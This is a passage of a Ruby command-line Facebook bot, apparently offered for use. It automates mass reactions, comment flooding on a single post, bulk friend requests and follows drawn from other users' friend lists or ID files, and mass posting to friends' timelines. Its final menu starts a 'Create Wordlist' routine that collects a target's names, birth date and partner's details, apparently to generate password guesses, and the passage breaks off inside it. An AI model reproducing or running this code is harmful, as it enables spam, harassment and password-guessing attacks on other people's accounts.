      a = Request("POST","#{id}/#{path}").to_s
      if !a.include? ('error')
        s += 1 
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  end
end

def ReactPostRandom()
  s = 0
  f = 0
  type = ['LIKE','LOVE','WOW','HAHA','ANGRY','SAD']
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp! ; id = id.tr(" ","")
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?fields=feed.limit(#{limit})")
  if !a.key? ('feed')
    puts ("#{$y}[!] No Posts") if a.key? ('id')
    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  else
    for i in a['feed']['data']
      tipe = type.sample
      path = (tipe == 'LIKE') ? "/likes?" : "/reactions?type=#{tipe}"
      id = i['id']
      b = Request("POST","#{id}#{path}").to_s
      if !b.include? ('error')
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  end
end

def ReactGroup()
  tipe = React()
  path = (tipe == 'LIKE') ? "/likes?" : "/reactions?type=#{tipe}"
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Group Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  a = Request("group?id=#{id}")
  if a.key? ('error')
    puts ("#{$y}[!] Group Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  else
    tik ("#{$w}[+] Group Name : #{a['name']}")
    puts ("#{$w}#{'═'*52}")
    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
    if !b.key? ('feed')
      puts ("#{$y}[!] No Post")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      ReactPostMenu()
    else
      for i in b['feed']['data']
        id = i['id']
        c = Request("POST","#{id}#{path}").to_s
        if !c.include? ('error')
          s += 1
          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
        else
          f += 1
          puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
        end
      end
      puts ("#{$w}#{'═'*52}")
      puts ("#{$g}[✓] Succes : #{s}")
      puts ("#{$y}[!] Failed : #{f}")
      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      ReactPostMenu()
    end
  end
end

def ReactGroupRandom()
  type = ['LIKE','LOVE','WOW','HAHA','ANGRY','SAD']
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Group Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  a = Request("group?id=#{id}")
  if a.key? ('error')
    puts ("#{$y}[!] Group Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    ReactPostMenu()
  else
    tik ("#{$w}[+] Group Name : #{a['name']}")
    puts ("#{$w}#{'═'*52}")
    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
    if !b.key? ('feed')
      puts ("#{$y}[!] No Post")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      ReactPostMenu()
    else
      for i in b['feed']['data']
        tipe = type.sample
        path = (tipe == 'LIKE') ? "/likes?" : "/reactions?type=#{tipe}"
        id = i['id']
        c = Request("POST","#{id}#{path}").to_s
        if !c.include? ('error')
          s += 1
          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
        else
          f += 1
          puts ("#{$w}[#{$y}!#{$w}] #{$r}Failed #{$w}-> #{$c}#{tipe} #{$w}-> #{$y}#{id}")
        end
      end
      puts ("#{$w}#{'═'*52}")
      puts ("#{$g}[✓] Succes : #{s}")
      puts ("#{$y}[!] Failed : #{f}")
      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      ReactPostMenu()
    end
  end
end    

def CommentPostMenu()
  system("clear")
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Comment Target Post")
  puts ("#{$w}║-> 2. Comment Group Post")
  puts ("#{$w}║-> 3. Reply Comment")
  puts ("#{$w}║-> 4. Spam Comment")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  mana = gets.chomp!
  case mana
    when'1'
      CommentPost()
    when '2'
      CommentGroup()
    when '3'
      ReplyComment()
    when '4'
      SpamComment()
    when '0'
      Bot()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      CommentPostMenu()
  end
end

def CommentPost()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}[!] Use <> For New Line")
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Comment : ")
  body = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  puts ("#{$w}#{'═'*52}")
  sub = body.tr("<>","\n")
  msg = ERB::Util.url_encode(sub)
  a = Request("#{id}?fields=feed.limit(#{limit})")
  if !a.key? ('feed')
    puts ("#{$y}[!] No Posts") if a.key? ('id')
    puts ("#{$y}[!] user Not Found!") if a.key? ('error')
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  else
    for i in a['feed']['data']
      id = i['id']
      b = Request("POST","#{id}/comments?message=#{msg}")
      if !b.key? ('error')
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  end
end

def CommentGroup()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}[!] Use <> For New Line")
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Group Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Comment : ")
  body = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  a = Request("group?id=#{id}")
  if a.key? ('error')
    puts ("#{$y}[!] Group Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  else
    tik ("#{$w}[+] Group Name : #{a['name']}")
    puts ("#{$w}#{'═'*52}")
    b = Request("v3.0/#{id}?fields=feed.limit(#{limit})")
    if !b.key? ('feed')
      puts ("#{$y}[!] No Post")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      CommentPostMenu()
    else
      sub = body.tr("<>","\n")
      msg = ERB::Util.url_encode(sub)
      for i in b['feed']['data']
        id = i['id']
        c = Request("POST","#{id}/comments?message=#{msg}")
        if !c.key? ('error')
          s += 1
          puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
        else
          f += 1
          puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...6]}... #{$w}-> #{$y}#{id}")
        end
      end
      puts ("#{$w}#{'═'*52}")
      puts ("#{$g}[✓] Succes : #{s}")
      puts ("#{$y}[!] Failed : #{f}")
      puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      CommentPostMenu()
    end
  end
end

def ReplyComment()
  system ('clear')
  s = 0
  f = 0
  puts ($logo)
  puts ("#{$w}[!] Use <> For New Line")
  puts ("#{$w}[!] Use @tag to mention users")
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Post Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Comment : ")
  body = gets.chomp!
  #sub = body.gsub("<>","\n")
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}/comments?limit=#{limit}")
  if !a.key? ('data')
    puts ("#{$y}[!] Post Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  elsif a['data'].empty?
    puts ("#{$y}[!] No Comments On Posts")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  else
    for i in a['data']
      id = i['id']
      user = '@['+i['from']['id']+ ':]'
      name = i['from']['name']
      #puts user
      sub = body.gsub("@tag",user)
      msg = sub.gsub("<>","\n")
      msg = ERB::Util.url_encode(msg)
      b = Request("POST","#{id}/comments?message=#{msg}")
      if !b.key? ('error')
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{name} #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{name} #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  end
end
    
def SpamComment()
  system ('clear')
  s = 0
  f = 0
  puts ($logo)  
  puts ("#{$w}[!] Use <> For New Line")
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Post Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Comment : ")
  body = gets.chomp!
  sub = body.tr("<>","\n")
  msg = ERB::Util.url_encode(sub)
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  #puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?")
  if a.key? ('from')
    tik ("#{$w}[+] Posted By #{a['from']['name']}")
    puts ("#{$w}#{'═'*52}")
    limit.times do
      b = Request("POST","#{id}/comments?message=#{msg}")
      if b.key? ('id')
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{body[0...8]}... #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{body[0...8]}... #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  else
    puts ("#{$y}[!] Post Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    CommentPostMenu()
  end
end

def AddFriendMenu()
  system ("clear")
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Add Friend From Target Id")
  puts ("#{$w}║-> 2. Add Friend From Friend")
  puts ("#{$w}║-> 3. Add Friend From File Id")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  mana = gets.chomp!
  case mana
    when '1'
      AddTarget()
    when '2'
      AddFrind()
    when '3'
      AddFile()
    when '0'
      Bot()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      AddFriendMenu()
  end
end

def AddTarget()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp!
  a = Request("#{id}?")
  tik ("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  if a.key? ('name')
    b = Request("POST","me/friends/#{id}?")
    if b == true
      puts ("#{$g}[✓] Name : #{a['name']}")
      puts ("#{$g}[✓] Status : Success")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      AddFriendMenu()
    else
      puts ("#{$y}[!] Name : #{a['name']}")
      puts ("#{$y}[!] Status : Failed")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      AddFriendMenu()
    end
  else
    puts ("#{$y}[!] User Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  end
end

def AddFrind()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Public Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  tik ("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?fields=friends.limit(#{limit})")
  if a.key? ('error')
    puts ("#{$y}[!] User Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  elsif !a.key? ('friends')
    puts ("#{$y}[!] There are no friends on the account")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  else
    for i in a['friends']['data']
      b = Request("POST","me/friends/#{i['id']}")
      if b == true
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Success : #{$c}#{i['name']} #{$w}-> #{$y}#{i['id']}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : #{$c}#{i['name']} #{$w}-> #{$y}#{i['id']}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  end
end

def AddFile()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] File Id : ")
  file = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  tik ("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  if File.file? (file)
    files = File.readlines(file, chomp: true).uniq
    for i in files[0...limit]
      a = Request("#{i}?")
      next if a.key? ('error')
      b = Request("POST","me/friends/#{i}?")
      if b == true
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  else
    puts ("#{$y}[!] File Not Found!")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    AddFriendMenu()
  end
end

def FollowMenu()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Follow target Id")
  puts ("#{$w}║-> 2. Follow From friend")
  puts ("#{$w}║-> 3. Follow Friend from Friend")
  puts ("#{$w}║-> 4. Follow From File Id")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  mana = gets.chomp!
  case mana
    when '1'
      FollowTarget()
    when '2'
      FollowFriend()
    when '3'
      FollowFromFriend()
    when '4'
      FollowFile()
    when '0'
      Bot()
    else
      puts ("#{$y}[!] Invalid Input")
      sleep(0.9)
      FollowMenu()
  end
end

def FollowTarget()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Target Id : ")
  id = gets.chomp!
  tik("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?")
  if a.key? ('error')
    puts ("#{$y}[!] User Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  else
    b = Request("POST","#{id}/subscribers?")
    if b == true
      puts ("#{$g}[✓] Name : #{a['name']}")
      puts ("#{$g}[✓] Status : Success")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      FollowMenu()
    else
      puts ("#{$y}[!] Name : #{a['name']}")
      puts ("#{$y}[!] Status : Failed")
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      FollowMenu()
    end
  end
end

def FollowFriend()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  tik ("#{$w}[+] Loading...")
  puts ("#{$w}#{'═'*52}")
  a = Request("me/friends?limit=#{limit}")
  abort ("#{$y}[!] Error") if a.key? ('error')
  for i in a['data']
    id = i['id']
    name = i['name']
    b = Request("POST","#{id}/subscribers?")
    if b == true
      s += 1
      puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
    else
      f += 1
      puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
    end
  end
  puts ("#{$w}#{'═'*52}")
  puts ("#{$g}[✓] Succes : #{s}")
  puts ("#{$y}[!] Failed : #{f}")
  puts ("#{$w}[+] Total  : #{s + f}#{$a}")
  print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
  FollowMenu()
end

def FollowFromFriend()
  s = 0
  f = 0
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] Public Id : ")
  id = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  tik ("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  a = Request("#{id}?fields=friends.limit(#{limit})")
  if a.key? ('error')
    puts ("#{$y}[!] User Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  elsif !a.key? ('friends')
    puts ("#{$y}[!] There are no friends on the account")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  else
    for i in a['friends']['data']
      name = i['name']
      id = i['id']
      b = Request("POST","#{id}/subscribers?")
      if b == true
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  end
end

def FollowFile()
  s = 0
  f = 0
  system ("clear")
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  print ("#{$w}[+] File Id : ")
  file = gets.chomp!
  print ("#{$w}[+] Limit : ")
  limit = gets.to_i
  tik ("#{$w}[+] Loading....")
  puts ("#{$w}#{'═'*52}")
  if File.file? (file)
    files = File.readlines(file, chomp: true).uniq
    for i in files[0...limit]
      a = Request("#{i}?")
      next if a.key? ('error')
      b = Request("POST","#{a['id']}/subscribers?")
      if b == true
        s += 1
        puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
      else
        f += 1
        puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{a['name']} #{$w}-> #{$y}#{i}")
      end
    end
    puts ("#{$w}#{'═'*52}")
    puts ("#{$g}[✓] Succes : #{s}")
    puts ("#{$y}[!] Failed : #{f}")
    puts ("#{$w}[+] Total  : #{s + f}#{$a}")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  else
    puts ("#{$y}[!] File Not Found")
    print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
    FollowMenu()
  end
end

def SharePost(link)
  system ("clear")
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Share To Facebook")
  puts ("#{$w}║-> 2. Share on a Friend's Timeline")
  puts ("#{$w}║-> 3. Share on a Page")
  puts ("#{$w}║-> 4. Share in WhatsApp")
  puts ("#{$w}║")
  print ("╚═#{$r}▶#{$w} ")
  mana = gets.chomp!
  case mana
    when '1'
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      msg = ERB::Util.url_encode(body)
      req = Request("POST","me/feed?link=#{link}&message=#{msg}")
      if req.key? ('id')
        puts ("#{$g}[✓] Succes  : #{req['id']}")
      else
        puts ("#{$y}[!] Failed  : nil")
      end
    when '2'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}[!] Use @tag to mention users")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      print ("#{$w}[+] Limit : ")
      limit = gets.to_i
      puts ("#{$w}#{'═'*52}")
      a = Request("me?fields=friends.limit(#{limit})")
      if a.key? ('error')
        puts (a)
        abort ("#{$r}[!] Error")
      elsif !a.key? ('friends')
         puts ("#{$y}[!] Your Account Has No Friends")
      else
        for i in a['friends']['data']
          id = i['id']
          name = i['name']
          user = '@['+id+':]'
          body = body.gsub("@tag",user)
          body = body.gsub("<>","\n")
          msg = ERB::Util.url_encode(body)
          b = Request("POST","#{id}/feed?message=#{msg}&link=#{link}")
          #puts b
          if b.key? ('id')
            s += 1
            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
          else
            f += 1
            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
          end
        end
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Succes : #{s}")
        puts ("#{$y}[!] Failed : #{f}")
        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      end
    when '3'
      s = 0
      f = 0
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      print ("#{$w}[+] Limit : ")
      limit = gets.to_i
      tik ("#{$w}[+] Loading....")
      msg = ERB::Util.url_encode(body)   
      puts ("#{$w}#{'═'*52}")
      a = Request("me/accounts?fields=name,access_token&limit=#{limit}")
      if !a.key? ('data')
        puts (a)
        abort ("#{$r}[!] Error")
      elsif a['data'].empty?
        puts ("#{$y}[!] Your Account Doesn't Have a Page")
      else
        for i in a['data']
          name = i['name']
          id = i['id']
          token = i['access_token']
          b = Request("POST",token=token,"#{id}/feed?link=#{link}&message=#{msg}")
          if b.key? ('id')
            s += 1
            puts ("#{$w}[#{$g}✓#{$w}] #{$g}Succes : #{$c}#{name} #{$w}-> #{$y}#{id}")
          else
	    f += 1
            puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed : #{$c}#{name} #{$w}-> #{$y}#{id}")
          end
        end
        puts ("#{$w}#{'═'*52}")
        puts ("#{$g}[✓] Succes : #{s}")
        puts ("#{$y}[!] Failed : #{f}")
        puts ("#{$w}[+] Total  : #{s + f}#{$a}")
      end
    when '4'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      code = system ("xdg-open --chooser whatsapp://send?text=#{link}")
      if code
        puts ("#{$g}[✓] Successfully Opening the WhatsApp Application")
      else
        puts ("#{$y}[!] Failed to Open the WhatsApp Application")
      end
    else
      puts ("#{$y}[!] Invalid Input")
  end
end

def lain()
  system ('clear')
  puts ($logo)
  puts ("#{$w}#{'═'*52}")
  puts ("#{$w}║-> 1. Write Status")
  puts ("#{$w}║-> 2  Write Timeline")
  puts ("#{$w}║-> 3. Create Wordlist")
  puts ("#{$w}║-> 4. Account Checker")
  puts ("#{$w}║-> 5. List of Groups")
  puts ("#{$w}║-> 6. Access Token")
  puts ("#{$w}║-> 7. Frofil Guard")
  puts ("#{$w}║-> 8. Download Video")
  puts ("#{$w}║-> 9. Fanpage")
  puts ("#{$w}║-> #{$g}0. Back")
  puts ("#{$w}║")
  print ("╚═#{$w}▶#{$w} ")
  mana = gets.chomp!
  case mana
    when '1'
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      msg = ERB::Util.url_encode(body)
      post = Request("POST","me/feed?message=#{msg}")
      puts ("#{$w}[#{$y}!#{$w}] #{$y}Failed  : nil") if !post.key? ('id')
      puts ("#{$w}[#{$g}✓#{$w}] Succes  : #{post['id']}") if post.key? ('id')
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '2'
      meet = true
      system ('clear')
      puts ($logo)
      puts ("#{$w}[!] Use <> For New Line")
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] Friend Id/Username : ")
      user = gets.chomp!
      print ("#{$w}[+] Message : ")
      body = gets.chomp!
      body = body.tr("<>","\n")
      tik ("#{$w}[+] Loading...")
      msg = ERB::Util.url_encode(body)
      puts ("#{$w}#{'═'*52}")
      a = Request("me/friends?fields=name,id,username")
      if !a.to_s.include? (user)
        puts ("#{$y}[!] Friends Not Found")
      else
        for i in a['data']
          name = i['name']
          username = i['username']
          id = i['id']
          if user == id or user == username
            meet = false
            post = Request("POST","#{id}/feed?message=#{msg}")
            if post.key? ('id')
              puts ("#{$w}[#{$g}✓#{$w}] Name   : #{name}")
              puts ("#{$w}[#{$g}✓#{$w}] FBID   : #{id}")
              puts ("#{$w}[#{$g}✓#{$w}] User   : #{username}")
              puts ("#{$w}[#{$g}✓#{$w}] Status : Success")
            else
              puts ("#{$w}[#{$y}!#{$w}] Name   : #{name}")
              puts ("#{$w}[#{$y}!#{$w}] FBId   : #{id}")
              puts ("#{$w}[#{$y}!#{$w}] User   : #{username}")
              puts ("#{$w}[#{$y}!#{$w}] Status : Failed")
            end
          end
        end
      end
      puts ("#{$y}[!] Friends Not Found") if meet
      print ("\n#{$r}[#{$g}Back#{$r}] #{$a}") ; gets
      lain()
    when '3'
      system ('clear')
      puts ($logo)
      puts ("#{$w}#{'═'*52}")
      print ("#{$w}[+] First Name : ")
      a = gets.chomp!
      print ("#{$w}[+] Middle Name : ")
      b = gets.chomp!
      print ("#{$w}[+] Last Name : ")
      c = gets.chomp!
      print ("#{$w}[+] Nick Name : ")
      d = gets.chomp!
      print ("#{$w}[+] Date of birth (DDMMYY) : ")
      e = gets.chomp!
      f = e[0...2]
      g = e[2...4]
      h = e[4...]
      puts ("#{$w}═"*52)
      puts ("#{$w}[!] SKIP IF TARGET SINGLES")
      print ("#{$w}[+] Girlfriend Name : ")
      i = gets.chomp!
      print ("#{$w}[+] Girlfriend Nickname : ")
      j = gets.chomp!
      print ("#{$w}[+] Date of birth (DDMMYY) : ")
      k = gets.chomp!
      l = k[0...2]
      m = k[2...4]
      n = k[4...]
